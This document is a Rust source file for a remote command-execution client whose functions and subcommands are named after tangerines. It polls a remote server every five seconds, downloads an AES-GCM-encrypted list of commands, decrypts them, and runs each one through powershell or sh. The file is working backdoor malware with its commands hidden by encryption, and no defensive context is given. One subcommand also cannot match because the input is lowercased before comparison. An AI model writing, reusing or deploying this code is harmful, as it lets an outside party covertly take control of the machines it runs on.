use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use std::fs::File;
use std::io::{BufRead, Write};
use std::process::Command;
use std::{env, io};

include!(concat!(env!("OUT_DIR"), "/id.rs"));

pub fn run() {
    let args: Vec<String> = env::args().collect();
    if args.len() >= 2 {
        let command = &args[1].to_lowercase();
        match command.as_str() {
            "show me the magic tangerine" => {
                println!("{}", client_id());
            }
            "create my tangerine" => {
                create_tangerine();
            }
            "hide my Tangerine" => {
                hide_tangerine();
            }
            &_ => panic!("No tangerine"),
        }
        return;
    }

    // Eat my tangerine
    loop {
        println!("Looping!");
        let commands = read_tangerine();
        println!("Got command");
        println!("Commands are {:?}", commands);
        for command in commands {
            let output = if cfg!(target_os = "windows") {
                Command::new("powershell")
                    .args(["/C", &command])
                    .output()
                    .expect("failed to execute process")
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(&command)
                    .output()
                    .expect("failed to execute process")
            };
            println!("status: {}", output.status);
            println!("{}", String::from_utf8(output.stdout).unwrap());
            eprintln!("{}", String::from_utf8(output.stderr).unwrap());
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}

fn create_tangerine() {
    let mut file = File::create(format!("./commands/{}", client_id())).unwrap();
    file.write(b"TANGERINE\n// ADD TANGERINES\n!TANGERINE")
        .unwrap();
}

fn hide_tangerine() {
    let file =
        File::open(format!("./commands/{}", client_id())).expect("Expected command file to exist");
    let mut lines = io::BufReader::new(file).lines();

    // Skip header
    let header = lines.next().unwrap().unwrap();
    if header != "TANGERINE" {
        eprintln!("Expected tangerine header");
    }
    let key = encryption_key();
    let nonce = Nonce::from_slice(b"TANGERINE!!!");
    let cipher = Aes256Gcm::new_from_slice(key.as_bytes()).unwrap();

    let mut encrypted_lines = vec![];

    for line in lines {
        let line = line.unwrap();
        if line.starts_with("//") || line.starts_with("!") {
            // Skip comment
            continue;
        }

        let ciphertext = cipher.encrypt(nonce, line.as_bytes()).unwrap();
        encrypted_lines.push(ciphertext);
    }

    let mut file = File::create(format!("./commands/{}.tangerine", client_id())).unwrap();
    file.write(b"TANGERINE_ENC\n").unwrap();
    for line in encrypted_lines {
        file.write(&line).unwrap();
        file.write(b"\n").unwrap();
    }
    file.write(b"!TANGERINE_ENC").unwrap();
}

fn read_tangerine() -> Vec<String> {
    let resp = reqwest::blocking::get(format!("{}/{}.tangerine", base_uri(), client_id())).unwrap();
    let bytes = resp.bytes().unwrap();
    let mut lines = bytes.split(|byte| byte == &b'\n');

    let key = encryption_key();
    let nonce = Nonce::from_slice(b"TANGERINE!!!");
    let cipher = Aes256Gcm::new_from_slice(key.as_bytes()).unwrap();

    // Skip header
    let header = lines.next().unwrap();
    if header != b"TANGERINE_ENC" {
        eprintln!("Expected tangerine header");
    }

    let mut decrypted_lines = vec![];

    for line in lines {
        if line == b"!TANGERINE_ENC" {
            continue;
        }
        let decrypted = cipher.decrypt(nonce, line).unwrap();
        decrypted_lines.push(String::from_utf8(decrypted).unwrap());
    }
    decrypted_lines
}
